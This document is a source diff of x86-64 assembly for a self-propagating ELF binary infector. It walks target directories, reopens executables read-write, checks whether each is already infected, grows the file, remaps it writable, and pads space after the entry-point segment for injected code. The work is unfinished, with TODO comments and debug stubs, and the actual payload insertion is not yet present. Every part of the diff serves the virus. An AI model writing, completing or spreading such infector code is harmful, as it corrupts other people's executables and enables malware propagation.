@@ -353,7 +353,7 @@ infect_single_file:
     push r10 ; size of mmap to r10
 
     mov rax, SYS_OPEN
-    mov rsi, O_RDONLY
+    mov rsi, O_RDWR
     syscall ; read
 
     test rax, rax
@@ -432,21 +432,69 @@ infect_single_file:
     jz .close_munmap
     
 
-    ; go to entry point offset in buffer, check if infected (TODO: calculate offset later)
+    ; go to entry point offset in buffer, check if infected 
     ; if infected, close and munmap and return
     mov rdi, r9
     mov rsi, rax
     call check_infected
     test rax, rax
     jnz .close_munmap
-    
-    call break
+
+    ; TODO: check if next segment after entry pheader
+    ; is a PT_LOAD segment
+    ; If no, close and munmap and return
 
 
     ; ftruncate to add 0x1000 (4096) bytes (hardcoded offset here)
-    ; mmap the file with new size here
+    mov rdi, r8
+    mov rsi, r10
+    add rsi, MAX_FILE_PAD
+    mov rax, SYS_FTRUNCATE
+    syscall
 
-    ; do the actual patching (TBD)
+
+    ; remap    
+    mov rdi, r9
+    mov rsi, r10
+    mov rax, SYS_MUNMAP
+    syscall
+
+    ; change local copy of file size
+    add r10, MAX_FILE_PAD
+
+    
+    ; mmap the file with new size here
+    ; addr = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0); // NOTE: need to free this using munmap
+    ; (rdi, rsi, rdx, rcx, r8, r9)
+    ; mmap file contents to buffer
+    push r10
+    mov rdi, 0
+    mov rsi, r10
+    mov rdx, PROT_READ | PROT_WRITE
+    mov r10, MAP_SHARED
+    mov r8, r8 ; fd is already in r8
+    mov r9, 0
+    mov rax, SYS_MMAP
+    syscall
+    pop r10
+
+    ; mmap buf to r9
+    mov r9, rax 
+
+
+    ; do the actual patching
+
+    ; pass for increasing padding
+    push rsi
+    mov rdi, r9
+    mov rsi, r10
+    call padding_pass
+    pop rsi
+
+	; TODO: check this with ls
+    call break
+
+    ; pass for updating offsets 
 
     ; check next program header (segment) comes next, and calulate space avail ((pheader_nxt.offset) - (pheader_curr.offset + size))
     ; if smaller than _end - _start, (WAIT NO)
@@ -558,7 +606,86 @@ get_entry_offset:
     ret
 
 
+; rdi - mmap buf
+; rsi - file size
+padding_pass:
+    push rbx
+    push r10 ; file size to r10
+	push r9 ; mamp buf to r9
+    push r8 ; entry addr to r8
 
+    mov r10, rsi ; file size to r10
+
+    mov r9, rdi ; mmap buf -> r9
+
+    add rdi, 0x18
+    mov r8, qword [rdi] ; entry addr -> r8
+
+    mov rsi, rdi
+    add rdi, 0x28 ; pheader table addr -> rdi
+    
+    add rsi, 0x20
+    movzx rsi, word [rsi] ; phnum  -> rsi
+
+    mov rbx, 0
+
+; locate the pheader for entry
+.loop:
+    cmp rbx, rsi
+    je exit_err
+
+    ; vaddr -> rdx 
+    mov rdx, qword [rdi + 0x10]
+    
+    ; vaddr + size -> rcx
+    mov rcx, qword [rdi + 0x20]
+    add rcx, rdx
+
+    ; cmp to see entry_addr in range? if yes, record offset + size and next segment offset
+    ; if no, continue
+    cmp r8, rdx
+    jl .loop_iter
+
+    cmp r8, rcx
+    jge .loop_iter
+
+	; if yes
+    ; entry segment offset + size -> rdx
+    mov rdx, [rdi + 0x08]
+    add rdx, [rdi + 0x20]
+
+    jmp .loop_end
+
+
+.loop_iter:
+    add rbx, 1
+    add rdi, 0x38
+    jmp .loop
+
+
+.loop_end:
+    
+    ; fill in start_offset -> end_offset
+
+    ; rdi - dst (mmap buf + start_offset)
+    ; rsi - number of bytes (MAX_FILE_PAD)
+    ; rdx - barrier ptr (mmap buf + (filesz - MAX_FILE_PAD)) 
+    mov rdi, r9
+    add rdi, rdx
+    mov rsi, MAX_FILE_PAD
+    mov rdx, r9
+    add rdx, r10
+    sub rdx, MAX_FILE_PAD
+    call mempad
+    call break
+
+
+.ret:
+    pop r8
+    pop r9
+    pop r10
+    pop rbx
+    ret
 
 
 error_exit:
@@ -739,6 +866,43 @@ memcmp:
 .done:
     ret
 
+; this function fill rsi bytes of 0 in dst, does not overwrite but shifts to the back instead
+; make sure to have enough space after barrier ptr for shift overriding
+; rdi - dst (mmap buf + start_offset)
+; rsi - number of bytes (MAX_FILE_PAD)
+; rdx - barrier ptr (mmap buf + (filesz - MAX_FILE_PAD))
+mempad:
+    mov rcx, 0
+
+.loop:
+    cmp rcx, rsi
+    jge .loop_end
+
+    mov rbx, rdx
+.ptr_loop:
+    cmp rbx, rdi
+    jl .ptr_loop_end
+    mov al, [rbx]
+    mov [rbx + 1], al
+
+.ptr_loop_iter:
+    sub rbx, 1
+    jmp .ptr_loop
+
+.ptr_loop_end:
+    mov byte [rdi], 0
+
+.loop_iter:
+    add rcx, 1
+    add rdx, 1
+    jmp .loop
+
+.loop_end:
+
+.ret:
+    ret
+
+
 break:
     ret
 ; -----------------------------------data-in-code-------------------------------
@@ -749,7 +913,6 @@ newline db `\n`
 slash db `/`
 null db 0
 
-; TODO: change this to root 
 root_dirs db `/tmp/test`, 0, `/tmp/test2`,0,0
 ; root_dirs db `/`,0,0
 
